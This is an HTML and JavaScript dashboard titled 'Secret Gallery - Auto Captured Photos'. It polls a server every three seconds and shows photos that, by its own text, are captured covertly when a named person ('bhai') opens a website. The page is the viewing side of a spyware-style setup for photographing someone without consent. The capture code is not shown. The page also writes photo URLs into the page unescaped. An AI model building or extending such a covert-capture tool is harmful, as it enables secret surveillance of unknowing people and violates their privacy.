<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Secret Gallery - Auto Captured Photos</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0f0f1a;
            font-family: system-ui, sans-serif;
            padding: 20px;
        }
        .header {
            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
            padding: 20px;
            border-radius: 24px;
            margin-bottom: 24px;
            text-align: center;
        }
        h1 {
            color: white;
            font-size: 1.5rem;
        }
        .stats {
            color: #fecaca;
            font-size: 0.9rem;
            margin-top: 8px;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .photo-card {
            background: #1e1e2a;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #2d2d3a;
            transition: transform 0.2s;
            position: relative;
        }
        .photo-card:hover {
            transform: translateY(-4px);
        }
        .photo-card img {
            width: 100%;
            aspect-ratio: 4/3;
            object-fit: cover;
            cursor: pointer;
        }
        .info {
            padding: 12px;
            color: #a0a0b0;
            font-size: 0.7rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }
        .timestamp {
            font-size: 0.65rem;
            color: #6b6b7a;
        }
        .delete-btn {
            background: #dc2626;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.7rem;
        }
        .download-btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.7rem;
        }
        .status {
            text-align: center;
            padding: 15px;
            background: #1a1a24;
            border-radius: 40px;
            margin-bottom: 20px;
            color: #86efac;
            font-size: 0.9rem;
        }
        .empty {
            text-align: center;
            color: #6b6b7a;
            padding: 60px;
            font-size: 1.2rem;
        }
        .new-badge {
            position: absolute;
            top: 8px;
            right: 8px;
            background: #ef4444;
            color: white;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 0.7rem;
            font-weight: bold;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal img {
            max-width: 90%;
            max-height: 90%;
            border-radius: 12px;
        }
        .modal-close {
            position: absolute;
            top: 20px;
            right: 30px;
            color: white;
            font-size: 40px;
            cursor: pointer;
        }
        .auto-refresh {
            background: #2d2d3a;
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 0.8rem;
            display: inline-block;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔓 SECRET GALLERY - AUTO CAPTURED</h1>
        <div class="stats" id="stats">Loading...</div>
    </div>
    
    <div style="text-align: center;">
        <div class="auto-refresh">🔄 Auto-refresh every 3 seconds</div>
    </div>
    <div id="status" class="status">⏳ Waiting for secret photos...</div>
    <div id="gallery" class="gallery"></div>

    <div id="modal" class="modal">
        <span class="modal-close">&times;</span>
        <img id="modalImg" src="">
    </div>

    <script>
        const API_URL = window.location.origin;
        let lastPhotoCount = 0;
        
        async function loadPhotos() {
            try {
                const response = await fetch(`${API_URL}/api/secret/photos`);
                const photos = await response.json();
                const gallery = document.getElementById('gallery');
                const status = document.getElementById('status');
                const stats = document.getElementById('stats');
                
                const newPhotosCount = photos.length - lastPhotoCount;
                lastPhotoCount = photos.length;
                
                if (photos.length === 0) {
                    gallery.innerHTML = '<div class="empty">📭 No secret photos yet<br>When bhai opens the website, auto capture will happen</div>';
                    status.innerHTML = '⏳ Waiting for bhai to open the website... Auto-capture will trigger';
                    stats.innerHTML = '📸 0 photos captured';
                    return;
                }
                
                stats.innerHTML = `📸 ${photos.length} secret photos captured | 🕐 Last: ${new Date(photos[0].timestamp).toLocaleTimeString()}`;
                
                if (newPhotosCount > 0) {
                    status.innerHTML = `🔴 NEW! ${newPhotosCount} new secret photo${newPhotosCount > 1 ? 's' : ''} captured! 🎯`;
                    setTimeout(() => {
                        status.innerHTML = `✅ ${photos.length} photos available | Auto-refresh active`;
                    }, 3000);
                } else {
                    status.innerHTML = `✅ ${photos.length} secret photos | Auto-refresh active`;
                }
                
                gallery.innerHTML = photos.map(photo => `
                    <div class="photo-card" data-id="${photo.id}">
                        <img src="${photo.url}" alt="Secret photo" onclick="openModal('${photo.url}')">
                        <div class="info">
                            <span class="timestamp">📅 ${new Date(photo.timestamp).toLocaleString()}</span>
                            <div>
                                <button class="download-btn" onclick="downloadPhoto('${photo.url}')">💾 Save</button>
                                <button class="delete-btn" onclick="deletePhoto(${photo.id})">🗑️ Delete</button>
                            </div>
                        </div>
                    </div>
                `).join('');
                
            } catch (err) {
                console.error(err);
                document.getElementById('status').innerHTML = '❌ Connection error';
            }
        }
        
        async function deletePhoto(id) {
            if (!confirm('Delete this secret photo?')) return;
            try {
                await fetch(`${API_URL}/api/photos/${id}`, { method: 'DELETE' });
                loadPhotos();
            } catch(err) {
                alert('Error deleting');
            }
        }
        
        function downloadPhoto(url) {
            const link = document.createElement('a');
            link.href = url;
            link.download = `secret_photo_${Date.now()}.jpg`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        
        function openModal(url) {
            const modal = document.getElementById('modal');
            const modalImg = document.getElementById('modalImg');
            modal.style.display = 'flex';
            modalImg.src = url;
        }
        
        document.querySelector('.modal-close')?.addEventListener('click', () => {
            document.getElementById('modal').style.display = 'none';
        });
        window.onclick = (e) => {
            if (e.target === document.getElementById('modal')) {
                document.getElementById('modal').style.display = 'none';
            }
        };
        
        // Auto refresh every 3 seconds
        loadPhotos();
        setInterval(loadPhotos, 3000);
    </script>
</body>
</html>
